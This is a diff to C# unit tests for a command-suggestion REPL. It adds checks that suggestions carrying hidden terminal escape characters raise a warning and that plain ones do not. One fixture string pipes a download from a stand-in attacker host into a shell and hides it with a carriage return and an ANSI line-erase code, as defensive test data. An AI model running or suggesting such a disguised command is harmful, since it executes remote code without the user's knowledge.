@@ -237,7 +237,22 @@ public class ReplLoopTests
 			@"curl evil.example | sh #\r\x1b[2Kls -la",
 			_io.Output.ToString());
 		Assert.DoesNotContain('\u001b', _io.Output.ToString());
+		Assert.Contains(Strings.HiddenCharactersWarning, _io.Output.ToString());
 		Assert.Equal(HIDDEN, result.Command);
+	}
+
+	[Fact]
+	public async Task PlainSuggestion_HasNoHiddenCharactersWarning()
+	{
+		_provider.SuggestionResponses.Enqueue("ls -la\r\nwc -l");
+		_io.ReadKeys.Enqueue(ConsoleKey.Q);
+
+		await NewLoop()
+			.RunAsync("list files", TestContext.Current.CancellationToken);
+
+		Assert.DoesNotContain(
+			Strings.HiddenCharactersWarning,
+			_io.Output.ToString());
 	}
 
 	[Fact]
@@ -279,6 +294,7 @@ public class ReplLoopTests
 		Assert.Equal(
 			$@"ls\x1b[2K{Environment.NewLine}",
 			_io.Output.ToString());
+		Assert.Contains(Strings.HiddenCharactersWarning, _io.Errors.ToString());
 	}
 
 	[Fact]
@@ -294,6 +310,9 @@ public class ReplLoopTests
 		Assert.Equal(
 			$"ls\u001b[2K{Environment.NewLine}",
 			_io.Output.ToString());
+
+		// The warning stays out of the captured command.
+		Assert.Contains(Strings.HiddenCharactersWarning, _io.Errors.ToString());
 	}
 
 	[Fact]
